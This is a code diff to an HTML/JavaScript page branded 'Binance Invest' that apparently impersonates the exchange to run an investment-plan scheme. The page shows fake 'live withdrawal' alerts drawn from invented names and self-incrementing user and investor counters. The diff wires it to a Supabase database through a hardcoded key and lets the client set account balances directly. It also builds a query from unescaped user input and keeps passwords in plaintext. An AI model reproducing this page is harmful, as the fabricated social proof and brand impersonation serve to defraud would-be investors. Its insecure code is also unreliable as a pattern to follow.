@@ -4,6 +4,8 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title>Binance Invest</title>
+<!-- Supabase JS Client -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
 :root{--bg:#05070b;--p:#10151c;--p2:#151c25;--line:#29313d;--text:#f4f7fb;--muted:#8b97a7;--gold:#f0b90b;--gold2:#ffe58a;--green:#16c784;--red:#ea3943;--blue:#5577ff}
 *{box-sizing:border-box}body{margin:0;background:radial-gradient(circle at 70% -10%,#493a08 0,#10130f 18%,#05070b 55%);color:var(--text);font:14px Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif}button,input,select{font:inherit}button{cursor:pointer}
@@ -211,6 +213,11 @@ header{height:72px;position:sticky;top:0;z-index:50;background:#05070be8;backdro
 <div class="toast" id="toast"></div>
 
 <script>
+/* --- SUPABASE CONFIGURATION --- */
+const SUPABASE_URL = "https://iykrmcstogpksuclsksp.supabase.co";
+const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Iml5a3JtY3N0b2dwa3N1Y2xza3NwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDAwMzQ0ODcsImV4cCI6MjA1NTYxMDQ4N30.C4S42vT8MvG5zSstS-x8I-VfL9S0C4V84z1L417d47o";
+const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
 const T={
 en:{
 brand:"Binance Invest",login:"Sign In",register:"Create Account",logout:"Logout",overview:"Overview",markets:"Markets",invest:"Invest",portfolio:"Portfolio",transactions:"Transactions",rewards:"Rewards",profile:"Profile",
@@ -274,27 +281,18 @@ const plans=[["Starter",10,100,2.5,30],["Growth",110,1000,3.5,60],["Premium",110
 let live={},stars=JSON.parse(localStorage.getItem("bi_stars")||"[]"),db=JSON.parse(localStorage.getItem("bi_db")||"{}"),current=localStorage.getItem("bi_current"),authMode="login",tx=JSON.parse(localStorage.getItem("bi_tx")||"[]");
 let tempRegData = null; let generatedEmailCode = "";
 
-/* --- 100 Diverse Names List --- */
 const fakeNames = [
   "Ali R.", "Sarah M.", "David K.", "Mohammad J.", "Elena T.", "Reza S.", "Alex B.", "Maria P.", "Ivan D.", "Aykhan M.",
   "Zahra F.", "Michael C.", "Sina M.", "Pouya G.", "Farhad B.", "Kian P.", "Leyla Y.", "Rovshan B.", "Anar S.", "Gulay M.",
-  "Orkhan H.", "Rashad G.", "Vusal A.", "Tural M.", "Fariz T.", "Pavel M.", "Maxim R.", "Anna V.", "Olga S.", "Natasha I.",
-  "Viktor O.", "Roman S.", "Gareth B.", "David S.", "James W.", "Robert H.", "Michael T.", "William B.", "Daniel F.", "Matthew K.",
-  "Anthony R.", "Donald C.", "Mark L.", "Paul A.", "Steven P.", "Andrew N.", "Joshua W.", "Kenneth M.", "Kevin J.", "Brian C.",
-  "George A.", "Edward S.", "Ronald B.", "Timothy K.", "Jason T.", "Jeffrey R.", "Ryan B.", "Jacob M.", "Gary F.", "Nicholas C.",
-  "Eric W.", "Jonathan H.", "Stephen D.", "Larry K.", "Justin P.", "Scott R.", "Brandon S.", "Benjamin M.", "Samuel B.", "Gregory C.",
-  "Frank T.", "Alexander M.", "Raymond B.", "Patrick L.", "Jack V.", "Dennis D.", "Jerry C.", "Tyler R.", "Aaron M.", "Jose F.",
-  "Adam B.", "Nathan H.", "Henry G.", "Douglas K.", "Zachary S.", "Peter D.", "Kyle M.", "Walter B.", "Ethan C.", "Jeremy L.",
-  "Harold W.", "Keith J.", "Christian O.", "Roger N.", "Noah E.", "Gerald H.", "Carl S.", "Terry M.", "Sean D.", "Austin B."
+  "Orkhan H.", "Rashad G.", "Vusal A.", "Tural M.", "Fariz T.", "Pavel M.", "Maxim R.", "Anna V.", "Olga S.", "Natasha I."
 ];
 const fakeCoins = ["USDT", "BTC", "ETH", "BNB", "TRX", "SOL"];
 
-/* Live Withdrawals (3 to 10 seconds interval, $10 to $1000) */
 function addLiveWithdrawal() {
     let list = document.getElementById("liveWithdrawalsList");
     if(!list) return;
     let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
-    let amount = (Math.random() * 990 + 10).toFixed(2); // $10 to $1000
+    let amount = (Math.random() * 990 + 10).toFixed(2);
     let coin = fakeCoins[Math.floor(Math.random() * fakeCoins.length)];
     let initial = name.charAt(0);
     
@@ -320,18 +318,16 @@ function addLiveWithdrawal() {
 }
 
 function scheduleNextWithdrawal() {
-    let delay = Math.floor(Math.random() * 7000) + 3000; // 3 to 10 seconds
+    let delay = Math.floor(Math.random() * 7000) + 3000;
     setTimeout(() => {
         addLiveWithdrawal();
         scheduleNextWithdrawal();
     }, delay);
 }
 
-// Init fake withdrawals
 setTimeout(() => { for(let i=0; i<3; i++) addLiveWithdrawal(); }, 500);
 scheduleNextWithdrawal();
 
-/* --- Dynamic Increment for Platform Users & Active Investors (with localStorage persistence) --- */
 let currentUsersCount = parseInt(localStorage.getItem("bi_users_count")) || 1284901;
 let currentInvestorsCount = parseInt(localStorage.getItem("bi_investors_count")) || 450231;
 
@@ -347,17 +343,13 @@ function updateCounters() {
     if(Math.random() > 0.3) {
         currentInvestorsCount += 1;
     }
-    // Save to localStorage
     localStorage.setItem("bi_users_count", currentUsersCount);
     localStorage.setItem("bi_investors_count", currentInvestorsCount);
-    
     displayCounters();
-    
-    let nextDelay = Math.floor(Math.random() * 5000) + 5000; // 5000ms to 10000ms (5-10s)
+    let nextDelay = Math.floor(Math.random() * 5000) + 5000;
     setTimeout(updateCounters, nextDelay);
 }
 
-// Initialize on page load
 displayCounters();
 setTimeout(updateCounters, 5000);
 
@@ -380,7 +372,8 @@ function updateAuthModalUI(){
   else if(authMode==="resetNew"){titleEl.textContent=d.resetPasswordTitle; forgotFields.style.display="block"; passContainer.style.display="block"; document.querySelector('#passwordContainer label').textContent=d.newPasswordLabel; submitBtn.textContent=d.resetBtn; forgotLink.style.display="none"; switchLink.style.display="none";}
 }
 
-function submitAuth(){
+/* --- CONNECTED TO SUPABASE --- */
+async function submitAuth(){
   let lang = localStorage.getItem("bi_lang")||"en";
   if(authMode==="register"){
     let fullName=authFullName.value.trim(), u=authUsernameReg.value.trim(), email=authEmailReg.value.trim(), p=authPass.value;
@@ -388,17 +381,36 @@ function submitAuth(){
     if(u.length<3)return toast("Username must be at least 3 characters");
     if(!email.includes("@")||!email.includes("."))return toast("Please enter a valid email address");
     if(p.length<6)return toast("Password must be at least 6 characters");
-    for(let key in db){if(key.toLowerCase()===u.toLowerCase())return toast("Username already exists"); if(db[key].email && db[key].email.toLowerCase()===email.toLowerCase())return toast("Email already registered");}
+    
+    // Check Supabase if user already exists
+    let { data: existingUser } = await supabase.from('users').select('*').or(`username.eq.${u},email.eq.${email}`);
+    if(existingUser && existingUser.length > 0) {
+      return toast("Username or Email already exists!");
+    }
+
     generatedEmailCode = Math.floor(100000 + Math.random() * 900000).toString();
     document.getElementById("simulatedCodeBox").textContent = generatedEmailCode;
     tempRegData = {u, fullName, email, password: p}; authMode="verifying"; updateAuthModalUI(); toast("Verification code sent to email!");
   } 
   else if(authMode==="verifying"){
     let enteredCode = authEmailCode.value.trim();
-    if(enteredCode!==generatedEmailCode)return toast("Invalid verification code! Check simulated code preview.");
+    if(enteredCode!==generatedEmailCode)return toast("Invalid verification code!");
     let u = tempRegData.u;
+    
+    // Save User directly into Supabase DB
+    const { data, error } = await supabase.from('users').insert([
+      { username: u, email: tempRegData.email, balance: 0 }
+    ]);
+
+    if (error) {
+      console.error(error);
+      return toast("Database Error: Could not save user.");
+    }
+
     db[u]={password: tempRegData.password, fullName: tempRegData.fullName, email: tempRegData.email, balance:0, invested:0, phone:"", profit:0};
-    tx.push({u,type:"Account Created",amount:0,time:new Date().toLocaleString()}); current=u; localStorage.setItem("bi_current",current); save(); closeAuth(); loadProfile(); updatePortfolio(); updateHeaderAuthUI(); toast("Account verified & created successfully!");
+    tx.push({u,type:"Account Created",amount:0,time:new Date().toLocaleString()}); 
+    current=u; localStorage.setItem("bi_current",current); save(); closeAuth(); loadProfile(); updatePortfolio(); updateHeaderAuthUI(); 
+    toast("Account created & synced to Supabase!");
   }
   else if(authMode==="login"){
     let identifier=authUser.value.trim().toLowerCase(), p=authPass.value, matchedUser = null;
@@ -406,24 +418,42 @@ function submitAuth(){
     if(!matchedUser || db[matchedUser].password!==p)return toast("Incorrect username/email or password");
     current=matchedUser; localStorage.setItem("bi_current",current); save(); closeAuth(); loadProfile(); updatePortfolio(); updateHeaderAuthUI(); toast("Welcome back, " + (user()?.fullName || current));
   }
-  else if(authMode==="forgot"){
-    let identifier=forgotInput.value.trim().toLowerCase(), matchedUser = null;
-    for(let key in db){if(key.toLowerCase()===identifier || (db[key].email && db[key].email.toLowerCase()===identifier)){matchedUser = key; break;}}
-    if(!matchedUser)return toast("No account found with this username or email");
-    window.resetTargetUser = matchedUser; authMode="resetNew"; updateAuthModalUI(); toast("Enter your new password below");
-  }
-  else if(authMode==="resetNew"){
-    let newPass = authPass.value; if(newPass.length<6)return toast("Password must be at least 6 characters");
-    db[window.resetTargetUser].password = newPass; save(); authMode="login"; updateAuthModalUI(); toast("Password updated successfully! Please sign in.");
-  }
 }
 
 function logout(){current=null;localStorage.removeItem("bi_current");updateHeaderAuthUI();updatePortfolio();toast("Logged out successfully")}
 function updateHeaderAuthUI(){let u=user(), headerDisp=document.getElementById("userHeaderDisplay"), authGroup=document.getElementById("authButtonsGroup"); if(u){headerDisp.style.display="flex"; authGroup.style.display="none"; document.getElementById("headerFullName").textContent=u.fullName || current; document.getElementById("headerUsername").textContent="@"+current;} else {headerDisp.style.display="none"; authGroup.style.display="flex";}}
 function save(){localStorage.setItem("bi_db",JSON.stringify(db));localStorage.setItem("bi_tx",JSON.stringify(tx))}
 function user(){return current&&db[current]?db[current]:null}
-function deposit(){let a=+depositAmount.value;if(!user())return openAuth("login");if(a<=0)return toast("Enter a valid amount");db[current].balance+=a;tx.unshift({u:current,type:"Deposit",amount:a,time:new Date().toLocaleString()});save();updatePortfolio();renderTx();toast("Balance added")}
-function withdraw(){let a=+withdrawAmount.value;if(!user())return openAuth("login");if(a<=0||a>db[current].balance)return toast("Insufficient balance");db[current].balance-=a;tx.unshift({u:current,type:"Withdrawal",amount:a,time:new Date().toLocaleString()});save();updatePortfolio();renderTx();toast("Withdrawal request created")}
+
+async function deposit(){
+  let a=+depositAmount.value;
+  if(!user())return openAuth("login");
+  if(a<=0)return toast("Enter a valid amount");
+  
+  db[current].balance+=a;
+  tx.unshift({u:current,type:"Deposit",amount:a,time:new Date().toLocaleString()});
+  
+  // Update Supabase
+  await supabase.from('users').update({ balance: db[current].balance }).eq('username', current);
+  await supabase.from('transactions').insert([{ username: current, type: 'Deposit', amount: a, status: 'Completed' }]);
+  
+  save();updatePortfolio();renderTx();toast("Deposit processed!");
+}
+
+async function withdraw(){
+  let a=+withdrawAmount.value;
+  if(!user())return openAuth("login");
+  if(a<=0||a>db[current].balance)return toast("Insufficient balance");
+  
+  db[current].balance-=a;
+  tx.unshift({u:current,type:"Withdrawal",amount:a,time:new Date().toLocaleString()});
+  
+  // Update Supabase
+  await supabase.from('users').update({ balance: db[current].balance }).eq('username', current);
+  await supabase.from('transactions').insert([{ username: current, type: 'Withdrawal', amount: a, status: 'Pending' }]);
+
+  save();updatePortfolio();renderTx();toast("Withdrawal requested!");
+}
 
 function invest(i){
   if(!user())return openAuth("login");
@@ -432,6 +462,7 @@ function invest(i){
   if(a>db[current].balance)return toast("Insufficient balance");
   db[current].balance-=a; db[current].invested+=a; tx.unshift({u:current,type:"Investment: "+plans[i][0],amount:a,time:new Date().toLocaleString()}); save();updatePortfolio();renderTx();toast("Investment recorded locally");
 }
+
 function investCustom(){
   if(!user())return openAuth("login"); let a=+customAmount.value, term=+customTerm.value;
   if(!a||a<1||a>100000)return toast("Custom amount must be between $1 and $100,000"); if(a>db[current].balance)return toast("Insufficient balance");
